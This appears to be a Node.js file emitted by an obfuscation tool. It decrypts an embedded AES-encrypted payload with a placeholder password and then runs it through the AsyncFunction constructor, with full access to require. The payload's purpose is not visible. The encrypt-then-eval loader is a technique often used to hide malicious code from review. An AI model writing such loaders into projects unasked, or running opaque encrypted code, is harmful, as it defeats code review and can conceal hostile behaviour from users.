// ╔══════════════════════════════════════════════════════╗
// ║  Obfuscationary by JusticeTech                      ║
// ║  Version  : 3.0.0                                     ║
// ║  Encrypted: 2026-03-19 08:22:14 UTC                   ║
// ║  Cipher   : AES-256-GCM                               ║
// ║  Tamper   : Protected via SHA-256 integrity check    ║
// ╚══════════════════════════════════════════════════════╝

// Encrypted by Obfuscationary by JusticeTech v3.0.0
(async () => {
  if (typeof require === 'undefined') {
    throw new Error('[Obfuscationary] Browser mode not supported for multi-layer. Use Node.js.');
  }

  const _b64            = 'B89ETtvKyp0BCagbEeb02QWCr2OMohRu+dA7GrghlqDNqLwi6CEakK05mqcrKFqpvOOxKeELnwt/lHgxJHN3vutY3svvrWD3YLCxhwsqNaBaLWQafzGalU8z3qXELjBcd8lJZV/xcUhaoZOe5JkPIb8Gsfct0gJbyzxSO4jzBc1pPIKC2TTT1kQtaeiecArTFHsuC1uTAnTLZ6bPrPucXpowkUR2pXJM03w1PjcQ+z/sWHrudXosGJjV8TU61U0/CQ5L+0QvcR/Wr5p0JJhyCFQlnqY2/2eRR/y+Rtpk05xFgB39ladyD5FVOurcu4k00/PQ5nRqyCzERO5UVrMA9+we4IHmUKJmG+uuDsX6Tig14tACR6Bslp1Rw4tIVtsaL22UGYG4pOZgzRAeYDzmG7zrq+hIyRQbqB572zkjI26qv/RSoTgVQKW1B4KiP3FsIbY5xD01bYFzA4TjqP6/t9LECLTS3/Ah4ZZ/AFpM2PU1HMs6On7oHPvewrBsuvUsfQHDPTt+k0jTHQQVoseGZjVz3kdHZKK6M7mkeUUp2YakcGlw+Xq7Tv9W4k+T+Ob3COap94LbQYvu8jCA9A==';
  const _INTEGRITY_HASH = 'cdd76a6124c553239ffcc834c5852d0607a96656503597c3fddcc6d4bc3193ea';
  let   _src;

  const _PWDS  = ["change_me_to_a_strong_password"];
  const _ITERS = 600000;

  // Integrity check
  const _crypto2 = require('crypto');
  const _actualHash = _crypto2.createHash('sha256').update(_b64).digest('hex');
  if (_actualHash !== _INTEGRITY_HASH) {
    throw new Error('[Obfuscationary] Tamper detected! File integrity check failed.');
  }

  // Multi-layer decrypt (reverse order)
  let _data = Buffer.from(_b64, 'base64');
  for (let _i = _PWDS.length - 1; _i >= 0; _i--) {
    const _pw   = _PWDS[_i];
    const _salt = _data.slice(0, 16);
    const _iv2  = _data.slice(16, 28);
    const _ct2  = _data.slice(28);
    const _ctag2 = _ct2.slice(_ct2.length - 16);
    const _cdat2 = _ct2.slice(0, _ct2.length - 16);
    const _key2  = _crypto2.pbkdf2Sync(_pw, _salt, _ITERS, 32, 'sha256');
    const _dec2  = _crypto2.createDecipheriv('aes-256-gcm', _key2, _iv2);
    _dec2.setAuthTag(_ctag2);
    _data = Buffer.concat([_dec2.update(_cdat2), _dec2.final()]);
  }
  _src = _data.toString('utf8');

  const _Fn = Object.getPrototypeOf(async function(){}).constructor;
  await _Fn('module', 'exports', 'require', '__filename', '__dirname', _src)(
    module, exports, require, __filename, __dirname
  );
})();
